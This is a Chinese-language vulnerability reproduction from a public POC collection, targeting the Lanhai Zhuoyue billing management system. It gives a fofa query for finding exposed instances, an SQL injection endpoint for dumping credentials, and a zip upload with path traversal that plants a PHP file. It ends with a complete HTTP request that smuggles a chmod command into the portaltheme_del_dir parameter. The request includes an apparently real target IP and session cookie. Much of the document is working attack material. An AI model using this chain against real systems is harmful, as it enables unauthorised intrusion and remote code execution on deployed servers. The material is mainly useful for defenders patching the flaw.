# 蓝海卓越计费管理系统多漏洞导致getshell

# 一、漏洞简介
 蓝海卓越认证计费管理系统是一套以实现网络运营为基础，增强全局安全为中心，提高管理效率为目的的网络安全运营管理系统，提供“高安全、可运营、易管理”的运营管理体验，基于标准的RADIUS协议开发，它不仅支持PPPOE和WEB认证计费，还支持802.1X接入控制技术，与其他厂商支持相应标准的产品兼容，结合蓝海卓越的PPPOE服务器网关，可提供更加丰富的功能。，另外，友好的Web访问管理的方式，为用户提供更好用、易用的方式，更贴心的使用形式。蓝海卓越计费管理系统多漏洞导致getshell

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征


# 四、漏洞复现
```plain
/ajax/loaduser.php?UserName=1
```

通过注入跑出账号密码


使用MD5解密出密码后登录系统


点击PORTAL模板下面的PORTAL模板管理，选择上传模板


[root.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/29512878/1716438804359-a43f8695-df0c-4b28-83bc-e23064072257.zip)

由于新版本系统的模板位置不在web路径下，所以需要穿越模板路径

Web绝对路径：

```plain
/usr/local/usr-gui/
```

模板路径：

```plain
/mnt/mysql/usr/local/portal/themes/20240519093115_xxx/
```

制作一个如下的压缩包：


test.php内容为：字符编码必须为Unix(LF)

```plain
#!/bin/php
<?php
phpinfo();
?>
```


上传zip压缩包


Shell位置为：

```plain
/test.php
```

但是访问时会提示：


接下来就需要使用后台命令执行漏洞进行权限赋予：

```plain
GET /ajax_check.php?portaltheme_del_id=4&portaltheme_del_dir=%2Fmnt%2Fmysql%2Fusr%2Flocal%2Fportal%2Fthemes%2F20210519093903_738%2F|chmod+755+/usr/local/usr-gui/test.php HTTP/1.1
Host: 
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
Referer: http://124.114.151.106:8880/portaltheme_list.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: mylang=zh_s; PHPSESSID=lp91fvnja6f987dj7jmkjh5601
Connection: close

```


之后再次访问

```plain
/test.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dbwc8rx9kq4t14eb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
